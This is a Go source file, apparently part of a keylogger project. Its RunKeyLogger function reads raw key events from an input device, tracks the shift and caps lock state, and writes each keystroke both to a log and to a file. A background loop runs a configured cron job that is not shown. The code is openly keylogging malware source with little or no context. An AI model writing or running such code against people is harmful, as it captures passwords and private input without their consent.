package main

import (
	"log"
)

var (
	shift bool
	caps  bool
)

func RunKeyLogger() {
	devs, err := NewDevices()
	if err != nil {
		log.Fatal(err)
	}
	rd := NewKeyLogger(devs[2])
	err = rd.Read()
	if err != nil {
		log.Fatal(err)
	}

	defer logfile.Close()
	go func() {
		for {
			CronJob(conf.GetString("cron_time"))
		}
	}()
	for ie := range ret {
		if ie.Type == EV_KEY {
			if ie.Value == 1 {
				if ie.Code == 42 || ie.Code == 54 {
					shift = true
				} else if ie.Code == 58 && caps == false {
					caps = true
				} else if ie.Code == 58 && caps == true {
					caps = false
				}
				log.Print(ie.KeyString(shift, caps))
				_, err = logfile.WriteString(ie.KeyString(shift, caps))
				checkErr(err)
				logfile.Sync()
			} else if ie.Value == 0 && (ie.Code == 42 || ie.Code == 54) {
				if shift {
					shift = false
				}
			}
		}
	}
}
